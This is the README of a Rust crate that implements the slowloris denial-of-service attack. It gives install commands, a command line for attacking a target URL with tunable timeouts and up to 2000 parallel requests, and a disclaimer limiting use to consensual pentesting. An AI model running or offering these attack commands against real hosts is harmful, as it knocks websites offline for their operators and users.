[![Crates.io](https://img.shields.io/crates/v/slowloris.svg)](https://crates.io/crates/slowloris)  
# slowloris-rs
The slow loris attack, now implemented in Rust!

## Usage
Installation:
```bash
$ cargo install slowloris
```

Attacking a host:  
```bash
$ slowloris https://some_random_website.com
```

Updating the slowloris command:
```bash
$ cargo install --force slowloris
```

Specifying the time between attacks and the number of parallel requests:
```bash
$ slowloris https://some_random_website.com --timeout 15 --requests 2000
```

## Features
- Fully concurrent
- Automatic retry
- Can attack TLS
- Customizable timout and number of requests

## Disclaimer
This tool is meant for consensual pentesting. Do not use it to attack hosts without their explicit permission.